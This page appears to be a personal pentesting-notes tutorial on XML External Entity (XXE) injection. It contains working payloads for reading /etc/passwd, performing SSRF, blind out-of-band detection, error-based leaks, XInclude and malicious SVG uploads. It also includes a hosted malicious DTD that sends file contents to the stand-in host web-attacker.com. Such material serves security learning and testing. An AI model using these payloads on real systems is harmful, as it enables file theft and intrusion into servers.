---
title: XXE Injection
category: Web
order: 16
---

XML External Entity injection as known as XXE is a vulnerability that allowss an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server and interact with any back-end or external systems that the application itself can access.

It can be also leverage to a SSRF attack.

There are various types of XXE attacks: 

* To retrieve files 
* To perform SSRF attacks
* Exfiltrate data out-of-band
* To retrieve data via error messages

# Exploiting XXE to retrieve files

To retrieve files we need to modify the `DOCTYPE` element that defines an external entity containing the path to the file and edit a value in the XML that is returned in the application's response.


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

> **Note**: We need to generally test each data node in the XML individually.


# Exploiting XXE to perform SSRF attacks

Aside from retrieval of sensitive data, the other main impact of XXE attacks is that they can be used to perform server-side request forgery (SSRF). This is a potentially serious vulnerability in which the server-side application can be induced to make HTTP requests to any URL that the server can access.


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://example.com/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

# Blind XXE vulnerabilities

Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.

There are two ways in which we can find and exploit an XXE vuln:

* Trigger out-of-band network interactions, sometimes exfiltrating sensitive data.
* Trigger XML parsing errors in such a way that the error message contains senstive data.

## Detecting blind XXE using out-of-band (OAST) techniques

We can detect blind XXE using the same technique as for XXE SSRF attack.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://collaborator.burp.com/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Some times XXE attacks using regular entities are blocked due to some input validation. In this situation we might be able to use **XML parameters entities** instead.

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://collaborator.burp.com/"> %xxe; ]>
```

## Exploiting blind XXE to exfiltrate data out-of-band

We can **host a malicious DTD** from within the in-band XXE payload.

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
This DTD carries out the following steps:

* Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
* Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.
* Uses the eval entity, which causes the dynamic declaration of the exfiltrate entity to be performed.
* Uses the exfiltrate entity, so that its value is evaluated by requesting the specified URL.

Once hosted our malicious DTD for example in `http://attacker.com/malicious.dtd` we can submit the following XXE payload with XML parameter on the vulnerable application.

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

> **Note**: This technique might not work with some file contents, including the newline characters. Try to use `ftp` instead of `http`. `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"ftp://web-attacker.com/malicious.dtd"> %xxe;]>`

## Exploiting blind XXE to retrieve data via error messages

An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response. 

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

This DTD carries out the following steps:

* Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
* Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called error. The error entity will be evaluated by loading a nonexistent file whose name contains the value of the file entity.
* Uses the eval entity, which causes the dynamic declaration of the error entity to be performed.
* Uses the error entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the /etc/passwd file.

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

# Hidden attack surface for XXE injection

## XInclude attacks

Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend **SOAP service**. 

In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a `DOCTYPE` element. However, you might be able to use `XInclude` instead.

```XML
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Example of exploitation:

![](/hackingnotes/images/xxe.png)

## File Upload

For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can **submit a malicious SVG image** and so reach hidden attack surface for XXE vulnerabilities. 

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

> **Note**: The content will be visible on the upload image as data. You can use a OCR to retrieve all the text.

## Via modified content type

Most `POST` requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`. Some web sites expect to receive requests in this format but will tolerate other content types, including XML. 

Example of normal request:

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Then we might be able to submit an XML.

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```